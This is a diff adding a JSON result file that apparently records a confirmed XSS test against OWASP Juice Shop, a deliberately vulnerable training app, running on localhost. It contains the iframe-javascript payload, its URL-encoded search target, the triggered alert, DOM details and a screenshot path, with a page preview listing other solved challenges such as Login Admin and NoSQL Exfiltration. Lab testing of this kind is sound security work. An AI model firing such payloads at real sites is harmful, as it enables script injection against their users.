@@ -1,0 +1,18 @@
+{
+  "target": "http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E",
+  "payload": "<iframe src=\"javascript:alert(`xss`)\">",
+  "elapsed_s": 8.595,
+  "dialogs": [
+    {
+      "type": "alert",
+      "message": "xss"
+    }
+  ],
+  "dom": {
+    "searchValueHtml": "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
+    "iframeCount": 1,
+    "bodyPreview": "This website uses fruit cookies to ensure you get the juiciest tracking experience. But me wait!\nMe want it!\nmenu\nOWASP Juice Shop\nsearch\nsearch\nclose\naccount_circle\nAccount\nshopping_cart\nYour Basket\n0\nlanguage\nEN\nYou successfully solved a challenge: Confidential Document (Access a confidential document.)\ncode\nJump to related coding challenge\nX\nYou successfully solved a challenge: Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)\nX\nYou successfully solved a challenge: Login Admin (Log in with the administrator's user account.)\ncode\nJump to related coding challenge\nX\nYou successfully solved a challenge: NoSQL Exfiltration (All your orders are belong to us! Even the ones which don't.)\nX\nYou successfully solved a challenge: Upload Type (Upload a file "
+  },
+  "screenshot": "screenshots\\xss-search-proof.png",
+  "confirmed": true
+}
